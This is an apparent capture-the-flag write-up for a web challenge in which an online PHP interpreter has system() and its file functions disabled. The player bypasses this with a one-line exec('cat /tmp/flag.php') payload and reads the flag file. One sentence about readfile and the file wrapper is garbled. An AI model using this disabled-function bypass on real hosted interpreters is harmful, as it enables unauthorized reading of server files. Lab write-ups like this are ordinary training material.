
# Nothing is impossible

> web

Author: [whitex](https://instagram.com/najeh_halawani)

## Description

One of our rabbits has lost the keys of his server to access his flag. He is crying desperately 
as he only remembers that the flag was in the path: `/tmp/flag.php` but he dont know how to get there.
Our friend BugsBunny was performing reconnaissance tasks when suddently found a web that could help 
you, please bring me back his flag.


## Writeup 

We find a PHP code editor and interpreter. In the description they indicate that the flag is in /tmp/flag.php

If we try to execute a command using system we get a warning indicating that this function is disabled.

```
Warning: system() has been disabled for security reasons 
```

The file_get_contents function and other file access functions are also disabled, however the readfile function does not work when the wrapper 'file: //' is disabled.

Let's try to execute some commands :) 

```
<?php 

echo exec('cat /tmp/flag.php');

?>

```

And we got the flag :) 

Pretty simple.

